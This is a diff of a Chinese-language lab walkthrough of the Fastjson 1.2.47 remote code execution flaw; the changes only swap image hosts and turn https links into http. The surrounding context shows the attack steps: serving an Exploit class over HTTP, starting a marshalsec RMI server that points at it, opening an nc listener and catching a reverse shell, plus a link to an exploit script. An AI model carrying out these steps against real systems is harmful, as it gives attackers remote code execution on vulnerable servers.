@@ -58,13 +58,13 @@ public class Exploit{
 
 `python3 -m http.server 80`
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-11_21-25-27.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-11_21-25-27.png)
 
-4.借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个RMI服务
+4.借助[marshalsec](http://github.com/mbechler/marshalsec)项目，启动一个RMI服务
 
 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.108/#Exploit" 8080`
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-11_21-29-27.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-11_21-29-27.png)
 
 5.nc 开启监听
 
@@ -95,23 +95,23 @@ Content-Length: 163
 
 注意rmi地址
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-11_21-31-17.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-11_21-31-17.png)
 
 
 
 7.回弹shell
 
-![](https://cdn.laohuan.art/Snipaste_2021-01-11_21-34-26.png)
+![](http://qn.laohuan.xin/Snipaste_2021-01-11_21-34-26.png)
 
 ##### fastjson检查脚本
 
-[https://github.com/mrknow001/fastjson_rec_exploit](https://github.com/mrknow001/fastjson_rec_exploit)
+[http://github.com/mrknow001/fastjson_rec_exploit](http://github.com/mrknow001/fastjson_rec_exploit)
 
 ##### 参考链接
 
-[https://www.cnblogs.com/lyh1/p/nul1.html](https://www.cnblogs.com/lyh1/p/nul1.html)
-[https://www.freesion.com/article/38861395538/](https://www.freesion.com/article/38861395538/)
-[https://www.jianshu.com/p/e22c9dd4ed6d](https://www.jianshu.com/p/e22c9dd4ed6d)
+[http://www.cnblogs.com/lyh1/p/nul1.html](http://www.cnblogs.com/lyh1/p/nul1.html)
+[http://www.freesion.com/article/38861395538/](http://www.freesion.com/article/38861395538/)
+[http://www.jianshu.com/p/e22c9dd4ed6d](http://www.jianshu.com/p/e22c9dd4ed6d)
 
-[https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce](https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce)
+[http://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce](http://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce)
 
